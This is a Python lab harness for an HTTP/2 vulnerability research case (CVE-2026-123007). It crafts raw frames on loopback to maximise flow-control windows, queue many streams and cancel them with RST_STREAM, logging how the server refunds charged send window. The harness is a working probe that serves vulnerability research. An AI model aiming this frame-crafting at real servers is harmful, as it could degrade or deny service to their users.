#!/usr/bin/env python3
"""Cancellation refund probe — CVE-2026-123007 lab harness (rung 2.5).

Same setup as h2probe.py (SETTINGS stream window MAX, connection WU to MAX,
GET /blob to block the socket, then fresh GET streams to build queued-unsent
DATA). Then it RST_STREAM(CANCEL)s those streams and observes what the worker
does with the window that was charged at queue time:

- while the socket is still blocked (nothing can be sent): does the refund
  fire at all?
- after draining the socket (flush can progress): are the cancelled streams'
  queued frames refunded (filter_cleanup refund loop) or just sent?

The worker-side truth comes from gdb instrumentation run by run-rst.sh
(lab/harness/gdb-rst.cmd): CHARGE (filter:1241), REFUND (filter:1767),
RST dispatch, CLOSE, and PING-marker snapshots of h2c->send_window.

Loopback only (127.0.0.1). Two rounds for the "repeated cancellations"
narrative, then stream 1 itself is cancelled.
"""

import json
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
W1 = MAX_WINDOW - 65535          # -> connection send_window = MAX
M = 40                           # streams cancelled per round
DRAIN_SECONDS = 6
DRAIN_CAP = 24 * 1024 * 1024

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FT_DATA, FT_HEADERS, FT_SETTINGS, FT_RST = 0, 1, 4, 3
FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1
RST_CANCEL = 8


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def rst(sid, status=RST_CANCEL):
    return frame(FT_RST, 0, sid, struct.pack(">I", status))


def headers_block():
    return bytes([0x82, 0x87, 0x44, 5]) + b"/blob" + \
        bytes([0x41, 9]) + b"localhost"


def get_blob(sid):
    return frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                 headers_block())


def drain(tls, seconds, cap=DRAIN_CAP):
    """Read up to cap bytes for `seconds`; return (bytes, eof, frames)."""
    tls.settimeout(0.3)
    buf = b""
    eof = False
    end = time.time() + seconds
    while len(buf) < cap and time.time() < end:
        try:
            chunk = tls.recv(65536)
        except (socket.timeout, TimeoutError):
            continue
        if not chunk:
            eof = True
            break
        buf += chunk
    frames, _ = parse_frames(buf)
    return buf, eof, frames


def parse_frames(buf):
    """Walk complete frames from offset 0 of this drain's stream slice."""
    frames = []
    i = 0
    while i + 9 <= len(buf):
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype, flags = buf[i + 3], buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7FFFFFFF
        if i + 9 + length > len(buf):
            break
        frames.append((ftype, flags, sid, length, buf[i + 9:i + 9 + length]))
        i += 9 + length
    return frames, i


def summarize(frames):
    """(per-sid DATA byte counts, PONG payloads, GOAWAY or None)."""
    data_bytes, pongs, goaway = {}, [], None
    for ftype, flags, sid, flen, payload in frames:
        if ftype == FT_DATA:
            data_bytes[sid] = data_bytes.get(sid, 0) + flen
        elif ftype == FT_PING and flags & FLAG_ACK:
            pongs.append(payload.decode("latin1"))
        elif ftype == FT_GOAWAY and len(payload) >= 8 and goaway is None:
            goaway = {
                "last_sid": int.from_bytes(payload[0:4], "big") & 0x7FFFFFFF,
                "error_code": int.from_bytes(payload[4:8], "big"),
            }
    return data_bytes, pongs, goaway


def main():
    result = {
        "build": sys.argv[1] if len(sys.argv) > 1 else "?",
        "w1": W1, "m": M,
        "cancelled_round1": [3 + 2 * i for i in range(M)],
        "cancelled_round2": [3 + 2 * (M + i) for i in range(M)],
        "markers": [],
    }

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
    sock.settimeout(5)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")

    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1) + get_blob(1))
    time.sleep(3)                                     # burst blocks socket

    tls.sendall(frame(FT_PING, 0, 0, b"mk00ping"))         # M0
    result["markers"].append("mk00ping")

    # round 1: charge via fresh streams, then cancel
    tls.sendall(b"".join(get_blob(3 + 2 * i) for i in range(M)))
    time.sleep(2)
    tls.sendall(frame(FT_PING, 0, 0, b"mk01ping"))         # M1: after charges
    result["markers"].append("mk01ping")

    tls.sendall(b"".join(rst(3 + 2 * i) for i in range(M)))
    time.sleep(2)
    tls.sendall(frame(FT_PING, 0, 0, b"mk02ping"))         # M2: cancelled, blocked
    result["markers"].append("mk02ping")

    buf, eof, frames = drain(tls, DRAIN_SECONDS)       # flush can progress
    data_bytes, pongs, goaway = summarize(frames)
    result["drain1"] = {"bytes": len(buf), "eof": eof,
                        "data_sids": {str(k): v for k, v in
                                      sorted(data_bytes.items())},
                        "pongs": pongs, "goaway": goaway}
    tls.sendall(frame(FT_PING, 0, 0, b"mk03ping"))         # M3: after flush
    result["markers"].append("mk03ping")

    # round 2: same shape, fresh stream ids
    tls.sendall(b"".join(get_blob(3 + 2 * (M + i)) for i in range(M)))
    time.sleep(2)
    tls.sendall(frame(FT_PING, 0, 0, b"mk04ping"))         # M4
    result["markers"].append("mk04ping")
    tls.sendall(b"".join(rst(3 + 2 * (M + i)) for i in range(M)))
    time.sleep(2)
    buf, eof, frames = drain(tls, DRAIN_SECONDS)
    data_bytes, pongs, goaway = summarize(frames)
    result["drain2"] = {"bytes": len(buf), "eof": eof,
                        "data_sids": {str(k): v for k, v in
                                      sorted(data_bytes.items())},
                        "pongs": pongs, "goaway": goaway}
    tls.sendall(frame(FT_PING, 0, 0, b"mk05ping"))         # M5
    result["markers"].append("mk05ping")

    # finally cancel stream 1 (partially-sent BLOCKED frame at queue head)
    tls.sendall(rst(1))
    time.sleep(2)
    buf, eof, frames = drain(tls, DRAIN_SECONDS)
    data_bytes, pongs, goaway = summarize(frames)
    result["drain3"] = {"bytes": len(buf), "eof": eof,
                        "data_sids": {str(k): v for k, v in
                                      sorted(data_bytes.items())},
                        "pongs": pongs, "goaway": goaway}
    tls.sendall(frame(FT_PING, 0, 0, b"mk06ping"))         # M6
    result["markers"].append("mk06ping")
    buf, eof, _ = drain(tls, 2, cap=256 * 1024)
    result["final_eof"] = eof

    tls.close()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
